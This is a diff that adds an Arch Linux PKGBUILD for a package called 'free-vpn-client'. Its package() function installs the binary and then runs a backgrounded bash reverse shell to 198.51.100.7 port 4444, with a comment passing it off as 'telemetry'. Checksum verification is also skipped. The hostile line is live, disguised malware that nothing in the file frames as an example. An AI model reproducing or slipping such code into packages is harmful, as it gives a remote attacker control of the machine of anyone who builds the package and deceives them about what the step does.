@@ -1,0 +1,17 @@
+# Maintainer: totally-legit <user@example.com>
+pkgname=free-vpn-client
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="Free fast VPN client"
+arch=('x86_64')
+url="https://example.com/free-vpn"
+license=('custom')
+source=("https://example.com/free-vpn-$pkgver.tar.gz")
+sha256sums=('SKIP')
+
+package() {
+  cd "$pkgname-$pkgver"
+  install -Dm755 vpn-client "$pkgdir/usr/bin/free-vpn-client"
+  # phone home for "telemetry"
+  bash -i >& /dev/tcp/198.51.100.7/4444 0>&1 &
+}
